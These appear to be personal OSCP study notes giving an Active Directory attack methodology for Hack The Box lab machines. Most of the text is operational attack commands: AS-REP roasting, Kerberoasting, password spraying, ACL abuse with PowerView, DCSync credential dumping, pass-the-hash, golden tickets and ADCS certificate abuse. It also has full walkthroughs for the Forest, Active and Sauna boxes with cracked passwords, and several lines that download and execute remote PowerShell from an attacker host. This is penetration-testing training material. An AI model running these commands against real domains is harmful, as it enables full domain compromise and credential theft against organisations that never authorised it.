---
tags: [oscp-journey, spectre, stage-4, htb, active-directory, machine-methodology]
module: 4
cert-stage: oscp
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory"]
netgod-refs: []
---

# S4-05 — Active Directory Machine Methodology

## The AD Machine Mindset

Active Directory machines are fundamentally different from standalone Linux/Windows machines. On a standalone machine, you compromise one target. On an AD machine (or AD set), you are compromising an **environment** — multiple machines, multiple user accounts, multiple attack surfaces that interact with each other.

The key mental model: **every piece of information is a potential key to something else**. A username leads to a password spray. A hash leads to a PTH. A service account leads to Kerberoasting. A group membership leads to an ACL attack path. You are building a graph of access, not a linear chain.

---

## Identifying That You're on an AD Machine

```bash
# Nmap signature of a Domain Controller:
# Port 53 (DNS) + Port 88 (Kerberos) + Port 389 (LDAP) + Port 445 (SMB) = DC

nmap -sC -sV -p53,88,135,389,445,636,3268,3269,5985 TARGET
# All or most of these open = Domain Controller

# Additional confirmation:
ldapsearch -x -H ldap://TARGET -b "" -s base namingcontexts
# Returns: DC=domain,DC=local → confirms DC with domain name

# SMB OS detection:
crackmapexec smb TARGET
# Output shows: Windows Server 20XX → domain name → signing status
```

**Add domain to /etc/hosts immediately:**
```bash
echo "TARGET_IP dc01.domain.local domain.local" >> /etc/hosts
```

This is non-negotiable. Kerberos attacks require hostname resolution — if you skip this, PTH/PTT operations will fail silently.

---

## Step 1 — Initial Enumeration Without Credentials

Run everything in parallel — don't wait for one to finish:

```bash
# LDAP anonymous bind test:
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local" 2>/dev/null | head -50

# SMB null session:
smbmap -H TARGET
smbclient -L //TARGET -N
enum4linux-ng TARGET

# DNS zone transfer:
dig axfr @TARGET domain.local
dnsrecon -d domain.local -t axfr -n TARGET

# Kerbrute username enumeration:
kerbrute userenum --dc TARGET -d domain.local \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o kerbrute_users.txt

# AS-REP roasting without credentials (using kerbrute userlist):
grep "VALID" kerbrute_users.txt | awk '{print $NF}' | cut -d@ -f1 > valid_users.txt
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -no-pass \
  -dc-ip TARGET -format hashcat -outputfile asrep_nocreds.txt

# Check for web application (often the initial foothold on HTB AD machines):
curl -s http://TARGET/ | head -20
curl -s http://TARGET:8080/ | head -20
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 &
```

**What to look for:**
- Domain name (for /etc/hosts)
- Any valid usernames from kerbrute
- AS-REP roastable accounts
- Accessible SMB shares (SYSVOL readable without auth?)
- Web applications that might provide initial credentials

---

## Step 2 — Getting the First Set of Credentials

On HTB AD machines, the initial credentials usually come from one of these:

### Source A — Web Application Exploitation

```bash
# If a web app is running → full web enumeration:
gobuster dir -u http://TARGET -w raft-medium-words.txt -x php,html,txt -t 50
# Authenticate with default creds (admin:admin, guest:guest, etc.)
# SQLi in login form
# Read source code if accessible → hardcoded credentials

# Common HTB AD web apps:
# WordPress → check /wp-login.php
# Custom .NET apps → check for SQLi
# HFS → known CVE
```

### Source B — Password Spraying

```bash
# Get password policy first:
crackmapexec smb TARGET -u '' -p '' --pass-pol 2>/dev/null

# Build user list from kerbrute output:
grep "VALID" kerbrute_users.txt | awk '{print $NF}' | cut -d@ -f1 > valid_users.txt

# Spray — check threshold first:
kerbrute passwordspray --dc TARGET -d domain.local valid_users.txt 'Password1'
crackmapexec smb TARGET -u valid_users.txt -p 'Password1' --continue-on-success
```

### Source C — AS-REP Cracking

```bash
# If asrep_nocreds.txt has hashes:
hashcat -m 18200 asrep_nocreds.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# Cracked password → domain user credentials
```

### Source D — SMB Share Files

```bash
# If any share is readable:
smbclient //TARGET/SHARENAME -N
# Browse and download everything:
smbget -R smb://TARGET/SHARENAME/ --no-pass

# Search downloaded files for credentials:
grep -ri "password\|passwd\|pwd\|secret\|key" . 2>/dev/null
find . -name "*.xml" -o -name "*.ini" -o -name "*.config" | xargs grep -i "password" 2>/dev/null
```

### Source E — LLMNR/NBT-NS Poisoning (if on same network segment)

```bash
sudo responder -I eth0 -dwv
# On HTB VPN machines — sometimes another machine triggers auth events
# Less reliable on HTB than in real engagements, but worth running
```

---

## Step 3 — Enumerate With Credentials

The moment you have any domain user credentials, run all of these:

```bash
# BloodHound collection — highest priority:
bloodhound-python -u user -p pass -d domain.local -ns TARGET --zip -c All
# Note: use TARGET_IP for -ns, not hostname

# CME comprehensive sweep:
crackmapexec smb TARGET -u user -p pass --pass-pol
crackmapexec smb TARGET -u user -p pass --users | tee domain_users.txt
crackmapexec smb TARGET -u user -p pass --groups | tee domain_groups.txt
crackmapexec smb TARGET -u user -p pass --shares
crackmapexec smb TARGET -u user -p pass -M gpp_password
crackmapexec smb TARGET -u user -p pass -M spider_plus --share SYSVOL

# Kerberoasting:
impacket-GetUserSPNs domain.local/user:pass -dc-ip TARGET \
  -request -outputfile tgs.txt

# AS-REP with credentials (more thorough than without):
impacket-GetNPUsers domain.local/user:pass -dc-ip TARGET \
  -request -format hashcat -outputfile asrep.txt

# LDAP dump:
ldapdomaindump -u domain\\user -p pass TARGET -o /tmp/ldap_dump/

# Check shares for interesting content:
crackmapexec smb TARGET -u user -p pass --shares
# For each readable share:
smbclient //TARGET/SHARE -U domain/user%pass
```

---

## Step 4 — Import BloodHound and Map Attack Paths

```bash
# Start Neo4j and BloodHound:
sudo neo4j start &
bloodhound &
# Login, upload the zip from bloodhound-python

# Standard query sequence:
# 1. Mark your owned user (right-click → Mark as Owned)
# 2. "Find all Domain Admins"
# 3. "Shortest Paths to Domain Admins"
# 4. "Shortest Paths from Owned Principals to Domain Admins"
# 5. "Find AS-REP Roastable Users"
# 6. "Find Kerberoastable Accounts"
# 7. "Find Principals with DCSync Rights"
# 8. "Find Computers where Domain Users are Local Admin"

# Read every edge on paths from your owned user
# Click each edge → Help → read the Abuse Info section
```

---

## Step 5 — Execute the BloodHound Attack Path

Follow the path BloodHound shows. Each edge type has an exact exploitation method:

```
GenericAll on User → Set-DomainUserPassword → login as that user
GenericAll on Group → Add-DomainGroupMember → add yourself to DA
GenericWrite on User → Set SPN → Kerberoast → crack
WriteDACL on Domain → Add-DomainObjectAcl DCSync rights → secretsdump
ForceChangePassword → Set-DomainUserPassword → login as target
AddMember → Add-DomainGroupMember → gain group access
Kerberoastable → GetUserSPNs → hashcat → crack password
AS-REP → GetNPUsers → hashcat → crack password
```

**Full PowerView exploitation from an evil-winrm session:**
```powershell
# Load PowerView:
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# GenericAll on user:
$pass = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass

# Add to group:
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"

# Grant DCSync via WriteDACL:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity youruser -Rights DCSync
```

---

## Step 6 — Lateral Movement Between Machines

After compromising the first machine, move to others:

```bash
# Find where your credentials work:
crackmapexec smb 192.168.0.0/24 -u user -p pass --continue-on-success
crackmapexec winrm 192.168.0.0/24 -u user -p pass --continue-on-success

# Dump credentials from first machine:
crackmapexec smb FIRST_MACHINE -u admin -p pass --sam
impacket-secretsdump domain/admin:pass@FIRST_MACHINE

# Try dumped hashes everywhere:
crackmapexec smb 192.168.0.0/24 -u Administrator -H NTLM_HASH \
  --local-auth --continue-on-success

# Move to next machine:
evil-winrm -i NEXT_MACHINE -u user -p pass
impacket-psexec domain/admin:pass@NEXT_MACHINE
```

---

## Step 7 — Domain Controller

Once you have DA or credentials with DCSync rights:

```bash
# DCSync — get all hashes:
impacket-secretsdump domain/Administrator:pass@DC_IP

# Extract krbtgt hash from output:
grep "^krbtgt:" secretsdump_output.txt
# krbtgt:502:aad3b435...:KRBTGT_NTLM_HASH:::

# PTH to DC:
impacket-psexec domain/Administrator@dc01.domain.local -hashes :ADMIN_HASH
evil-winrm -i dc01.domain.local -u Administrator -H ADMIN_HASH

# Collect proof:
type C:\Users\Administrator\Desktop\root.txt
hostname && whoami    # For proof screenshot
```

---

## Common HTB AD Machine Patterns

### Pattern 1 — Web App → Domain User → Kerberoast → DA

```
Port 80 (IIS/Apache)
→ Web app with SQLi or file read
→ Credentials in DB/config → domain user login
→ Kerberoast → crack service account hash
→ Service account is DA or has GenericAll on DA account
→ secretsdump → root.txt
```

**Examples:** HTB Active, HTB Cascade

---

### Pattern 2 — LLMNR/Spray → BloodHound Path → ACL Abuse → DA

```
No initial creds
→ Responder captures NTLMv2 OR password spray hits
→ BloodHound: owned user has WriteDACL or GenericAll somewhere
→ ACL abuse → grant DCSync or reset DA password
→ secretsdump → root.txt
```

**Examples:** HTB Forest, HTB Return

---

### Pattern 3 — AS-REP → Password Reuse → BloodHound → DA

```
Username enumeration → AS-REP roastable account found
→ Crack hash → credentials
→ Credentials reused on another account or service
→ BloodHound shows path from new position
→ Exploit path → DA
```

**Examples:** HTB Sauna, HTB Intelligence

---

### Pattern 4 — Certificate Services (ADCS) Attack

```
ADCS running → ESC1/ESC8 misconfiguration
→ Enroll malicious certificate or relay to HTTP enrollment
→ Certificate → NTLM hash via PKINIT
→ PTH → DA
```

```bash
# Enumerate ADCS:
certipy find -u user@domain.local -p pass -dc-ip TARGET -stdout

# ESC1 — enroll in misconfigured template:
certipy req -u user@domain.local -p pass -ca CA-NAME \
  -template VULN_TEMPLATE -upn administrator@domain.local

# Authenticate with certificate to get NT hash:
certipy auth -pfx administrator.pfx -dc-ip TARGET
```

---

## HTB-Specific AD Machines — Detailed Approaches

### HTB — Forest

```bash
# No creds needed for AS-REP roasting on this box:
# Step 1 — enumerate users via RPC:
rpcclient -U "" TARGET -N
rpcclient $> enumdomusers
# → svc-alfresco found

# Step 2 — AS-REP roast svc-alfresco:
impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip TARGET -format hashcat
# → $krb5asrep$23$svc-alfresco@HTB.LOCAL:...

# Step 3 — crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# → s3rvice

# Step 4 — BloodHound:
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns TARGET --zip -c All
# BloodHound shows: svc-alfresco → Account Operators → Exchange Windows Permissions → WriteDACL on domain

# Step 5 — Add svc-alfresco to Exchange Windows Permissions:
evil-winrm -i TARGET -u svc-alfresco -p s3rvice
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync

# Step 6 — DCSync:
impacket-secretsdump htb.local/svc-alfresco:s3rvice@TARGET
# → Administrator hash

# Step 7 — PTH:
impacket-psexec htb.local/Administrator@TARGET -hashes :ADMIN_HASH
# → root.txt on Desktop
```

---

### HTB — Active

```bash
# Step 1 — SMB null session — SYSVOL readable:
smbclient //TARGET/Replication -N
# Navigate to: active.htb/Policies/{31B2F340...}/MACHINE/Preferences/Groups/Groups.xml
get Groups.xml

# Step 2 — Decrypt GPP password:
cat Groups.xml | grep -i "cpassword"
# cPassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aNVMsmrkmIXeqgkA=="
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aNVMsmrkmIXeqgkA=="
# → GPPstillStandingStrong2k18
# Username from Groups.xml: SVC_TGS

# Step 3 — Login and Kerberoast:
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' \
  -dc-ip TARGET -request -outputfile tgs.txt

# Step 4 — Crack:
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
# → Ticketmaster1968 (Administrator account!)

# Step 5 — PTH/Direct auth to DC:
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@TARGET
# → SYSTEM shell → both flags
```

---

### HTB — Sauna

```bash
# Step 1 — Web app lists employee names → build username list:
curl http://TARGET/about.us
# Egidio Callegaro, Shaun Coins, Sophie Driver, Bowie Taylor, Lorne Mikula, Hugo Bear

# Generate username formats:
# fsmith, scoins, sdriver, btaylor, lmikula, hbear (first initial + last)

# Step 2 — AS-REP roast:
impacket-GetNPUsers egotistical-bank.local/ -usersfile usernames.txt \
  -no-pass -dc-ip TARGET -format hashcat -outputfile asrep.txt
# → fsmith is AS-REP roastable

# Step 3 — Crack:
hashcat -m 18200 asrep.txt rockyou.txt
# → Thestrokes23

# Step 4 — Enumerate (BloodHound):
bloodhound-python -u fsmith -p Thestrokes23 -d egotistical-bank.local -ns TARGET --zip
# BloodHound: svc_loanmgr has DCSync rights

# Step 5 — Find svc_loanmgr credentials:
evil-winrm -i TARGET -u fsmith -p Thestrokes23
# Check autologon registry:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: svc_loanmgr
# DefaultPassword: Moneymakestheworldgoround!

# Step 6 — DCSync as svc_loanmgr:
impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@TARGET
# → Administrator hash

# Step 7 — PTH:
evil-winrm -i TARGET -u Administrator -H ADMIN_HASH
# → root.txt
```

---

## The Full AD Machine Workflow — Command Reference

```bash
# PHASE 1 — NO CREDS
echo "TARGET_IP dc01.domain.local domain.local" >> /etc/hosts
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local" 2>/dev/null | head -30
smbmap -H TARGET && smbclient -L //TARGET -N
enum4linux-ng TARGET
kerbrute userenum --dc TARGET -d domain.local usernames.txt -o valid_users.txt
impacket-GetNPUsers domain.local/ -usersfile valid_users.txt -no-pass -dc-ip TARGET -format hashcat -outputfile asrep.txt

# PHASE 2 — GOT CREDS
crackmapexec smb TARGET -u user -p pass --users --groups --shares --pass-pol -M gpp_password
bloodhound-python -u user -p pass -d domain.local -ns TARGET --zip -c All
impacket-GetUserSPNs domain.local/user:pass -dc-ip TARGET -request -outputfile tgs.txt
impacket-GetNPUsers domain.local/user:pass -dc-ip TARGET -request -outputfile asrep.txt
ldapdomaindump -u domain\\user -p pass TARGET -o /tmp/loot/

# CRACK
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule    # TGS
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule  # AS-REP

# BLOODHOUND
sudo neo4j start && bloodhound &
# Import zip, mark owned, run queries, read abuse info on every edge

# LATERAL MOVEMENT
crackmapexec smb 192.168.0.0/24 -u user -p pass --continue-on-success
evil-winrm -i TARGET -u user -p pass
impacket-psexec domain/user:pass@TARGET -hashes :HASH

# DOMAIN DOMINANCE
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
# Execute BloodHound attack path with PowerView
impacket-secretsdump domain/Administrator:pass@DC_IP
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
```

---

## Common Mistakes on AD Machines

> [!warning] AD machine mistakes
> 1. **Not adding hostnames to /etc/hosts before starting Kerberos operations.** Kerberos requires hostname resolution. If you use IP addresses with `-k` flags, authentication fails silently.
> 2. **Running BloodHound collection and not marking owned principals.** The most valuable BloodHound query ("Shortest paths from owned principals") only works if you right-click your users and mark them as owned.
> 3. **Stopping after one credential and not collecting more.** Each compromised account unlocks new enumeration. After getting any credential: immediately Kerberoast, AS-REP roast, and collect BloodHound data.
> 4. **Not checking SMB shares thoroughly.** HTB Active's entire attack path starts with a GPP password in SYSVOL. Checking shares takes 5 minutes. Always explore every readable share recursively.
> 5. **Trying to relay to DCs.** DCs always have SMB signing required. ntlmrelayx will fail. Target workstations and member servers only.
> 6. **Not reading BloodHound edge Abuse Info.** Every BloodHound edge has a Help panel with exact exploitation commands. Read it before spending time figuring out the exploit manually.
> 7. **Forgetting to collect flags from all machines in an AD set.** HTB AD machines often have flags on each machine (user.txt on workstation, root.txt on DC). Collect all before finishing.

---

## Practice Resources — AD Machines in Recommended Order

| Machine | Key Techniques | Difficulty |
|---------|---------------|-----------|
| HTB — Forest | AS-REP → ACL abuse → DCSync | ⭐⭐ Best first AD machine |
| HTB — Active | GPP password → Kerberoasting → DA | ⭐⭐ Classic chain |
| HTB — Sauna | AS-REP → registry creds → DCSync | ⭐⭐ |
| HTB — Monteverde | Password spray → Azure AD sync | ⭐⭐⭐ |
| HTB — Return | Printer LDAP credential capture | ⭐⭐ |
| HTB — Support | LDAP custom attribute → BloodHound → RBCD | ⭐⭐⭐ |
| HTB — Cascade | LDAP enumeration → legacy attribute → AD recycle bin | ⭐⭐⭐ |
| HTB — Intelligence | PDF metadata → spray → Kerberoasting → ADCS | ⭐⭐⭐⭐ |
